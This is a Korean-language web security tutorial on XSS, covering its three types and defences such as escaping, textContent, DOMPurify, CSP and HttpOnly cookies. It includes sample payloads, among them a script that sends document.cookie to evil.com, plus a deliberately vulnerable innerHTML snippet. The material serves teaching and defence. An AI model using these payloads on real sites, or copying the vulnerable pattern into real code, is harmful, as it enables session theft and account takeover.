---
title: "XSS(크로스 사이트 스크립팅) 완전 정복"
description: "Stored·Reflected·DOM-based XSS 세 가지 유형의 동작 원리와 공격 벡터, HTML 이스케이프·DOMPurify·textContent·CSP로 방어하는 실전 전략을 정리합니다."
author: "PALDYN Team"
pubDate: "2026-05-22"
archiveOrder: 1
type: "knowledge"
category: "JavaScript"
tags: ["JavaScript", "보안", "XSS", "CSP", "DOMPurify", "HTML이스케이프", "크로스사이트스크립팅"]
featured: false
draft: false
---

[지난 글](/posts/perf-cpu-profiling-flame/)에서 플레임 차트로 CPU 병목을 찾는 방법을 살펴봤습니다. 이번 글부터는 보안 시리즈를 시작합니다. 첫 주제는 웹 취약점 중 가장 흔하면서도 파급력이 큰 **XSS(Cross-Site Scripting)**입니다. 이름에 "CSS"처럼 스타일시트와 혼동하지 않도록 XSS로 줄여 씁니다.

## XSS란 무엇인가

XSS는 공격자가 신뢰할 수 있는 사이트에 악성 스크립트를 주입해, 다른 사용자의 브라우저에서 그 코드가 실행되게 하는 공격입니다. 스크립트가 실행되면 쿠키·세션 토큰 탈취, 피싱 폼 삽입, 키로거 설치, CSRF 토큰 읽기 등 거의 모든 클라이언트 측 공격이 가능해집니다.

핵심 조건은 두 가지입니다. 첫째, 사용자 입력이 **이스케이프 없이** 브라우저에 HTML로 렌더링되는 지점(sink)이 있어야 합니다. 둘째, 공격자가 그 경로에 스크립트를 주입할 수 있어야 합니다.

## XSS 세 가지 유형

![XSS 공격 유형 3가지](/assets/posts/sec-xss-types.svg)

### ① Stored XSS (저장형)

공격자가 댓글·게시글·프로필 이름 같은 필드에 `<script>` 태그를 포함한 문자열을 입력하면, 서버가 이를 **그대로 DB에 저장**했다가 다른 사용자에게 응답 HTML에 포함시켜 보내는 방식입니다.

```html
<!-- 공격자가 입력한 댓글 -->
좋은 글이네요! <script>document.location='https://evil.com/?c='+document.cookie</script>
```

이 방식은 한 번 심어두면 해당 페이지를 방문하는 **모든 사용자**에게 영향을 미칩니다. 관리자 계정을 탈취하면 사이트 전체를 장악할 수 있어 가장 위험합니다.

### ② Reflected XSS (반사형)

URL의 쿼리 파라미터나 폼 데이터를 서버가 응답에 즉시 반영할 때 발생합니다.

```
https://example.com/search?q=<script>alert(1)</script>
```

서버가 검색어를 이스케이프 없이 HTML에 포함시키면 스크립트가 실행됩니다. DB에는 저장되지 않으므로 **피해자가 공격 링크를 직접 클릭**해야 발동됩니다. 이메일·메신저를 통한 피싱과 자주 결합됩니다.

### ③ DOM-based XSS

서버가 정상 응답을 보내더라도, 클라이언트 측 JavaScript가 URL의 해시(`#`) 또는 `window.name` 같은 값을 읽어 `innerHTML`에 직접 삽입하면 서버를 거치지 않고 공격이 완성됩니다.

```js
// ❌ 위험 — URL fragment를 그대로 DOM에 삽입
document.getElementById('output').innerHTML = location.hash.slice(1);
```

서버 로그에 흔적이 남지 않아 탐지가 어렵습니다.

## Source와 Sink

XSS 분석의 핵심 개념이 **source**(오염된 데이터의 출처)와 **sink**(데이터를 HTML로 렌더링하는 지점)입니다.

| Source | Sink |
|---|---|
| `location.search / hash` | `innerHTML`, `outerHTML` |
| `document.referrer` | `document.write()` |
| `window.name` | `eval()`, `setTimeout(string)` |
| 폼 입력값 | `src`, `href` 어트리뷰트 |

Source에서 Sink까지 오염이 전파되는 경로를 **taint flow**라고 하며, 정적 분석 도구(ESLint 플러그인, CodeQL)가 자동으로 추적합니다.

## 방어 전략

![XSS 방어 코드 패턴](/assets/posts/sec-xss-defense.svg)

### 1. HTML 이스케이프 (출력 단계)

서버에서 사용자 입력을 HTML로 출력할 때 반드시 `&`, `<`, `>`, `"`, `'` 다섯 문자를 HTML 엔티티로 변환해야 합니다.

```js
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
```

React·Vue·Angular 같은 현대 프레임워크는 기본적으로 템플릿 표현식을 이스케이프합니다. 다만 `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]` 같은 "원시 HTML 삽입" API를 사용할 때는 반드시 직접 검증이 필요합니다.

### 2. textContent / setAttribute 사용

DOM 조작 시 `innerHTML` 대신 `textContent`를 쓰면 브라우저가 태그를 파싱하지 않고 문자열로만 처리합니다.

```js
// ❌ 위험
el.innerHTML = userInput;

// ✅ 안전
el.textContent = userInput;

// ✅ 링크 href도 setAttribute로 설정
anchor.setAttribute('href', sanitizeUrl(url));
```

### 3. DOMPurify로 HTML 허용 시 정화

리치 텍스트 에디터처럼 HTML 태그를 허용해야 할 때는 **DOMPurify** 라이브러리가 허용 태그·속성 화이트리스트로 악성 태그를 제거합니다.

```js
import DOMPurify from 'dompurify';

const dirty = '<b>굵게</b><script>steal()</script>';
const clean = DOMPurify.sanitize(dirty);
// → '<b>굵게</b>' — script 태그 제거됨

// 설정으로 허용 태그 제한
const strict = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
});
```

### 4. Content-Security-Policy (CSP)

HTTP 응답 헤더 `Content-Security-Policy`는 브라우저에게 어떤 출처의 스크립트만 실행할지 알려줍니다. 인라인 스크립트를 차단하면 XSS 주입 성공 시에도 스크립트 실행이 막힙니다.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  object-src 'none';
  base-uri 'self';
```

`nonce` 방식은 서버가 요청마다 무작위 값을 생성해 헤더와 `<script nonce="...">` 태그 양쪽에 넣는 것으로, 공격자가 nonce를 모르면 인라인 스크립트를 심어도 실행되지 않습니다.

### 5. HttpOnly 쿠키

세션 쿠키에 `HttpOnly` 플래그를 설정하면 JavaScript에서 `document.cookie`로 읽을 수 없어, XSS가 성공해도 **세션 탈취**를 막을 수 있습니다.

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

## URL 검증 — javascript: 스킴

`<a href="javascript:alert(1)">` 형태처럼 `href`나 `src`에 `javascript:` 스킴을 삽입하는 공격도 XSS입니다. URL을 어트리뷰트에 넣기 전에 스킴을 반드시 검사해야 합니다.

```js
function isSafeUrl(url) {
  try {
    const { protocol } = new URL(url, location.origin);
    return ['http:', 'https:'].includes(protocol);
  } catch {
    return false;
  }
}
```

## 프레임워크별 주의점

| 프레임워크 | 안전 | 위험 |
|---|---|---|
| React | `{expression}` | `dangerouslySetInnerHTML` |
| Vue | `{{ expression }}` | `v-html` |
| Angular | `{{ expression }}` | `[innerHTML]`, `bypassSecurityTrust*` |
| Vanilla JS | `textContent` | `innerHTML`, `eval` |

## 정리

XSS를 막는 원칙은 단순합니다. **사용자 데이터는 절대 HTML로 직접 삽입하지 않는다.** 불가피하게 HTML을 허용해야 한다면 DOMPurify로 정화하고, CSP로 최후 방어선을 구축합니다. 다음 글에서는 사이트 간 위조 요청인 CSRF를 다룹니다.

---

**지난 글:** [CPU 프로파일링과 플레임 차트 — 병목 함수 찾기](/posts/perf-cpu-profiling-flame/)

**다음 글:** [CSRF와 SameSite 쿠키 — 사이트 간 요청 위조 방어](/posts/sec-csrf-samesite/)

<br>
읽어주셔서 감사합니다. 😊
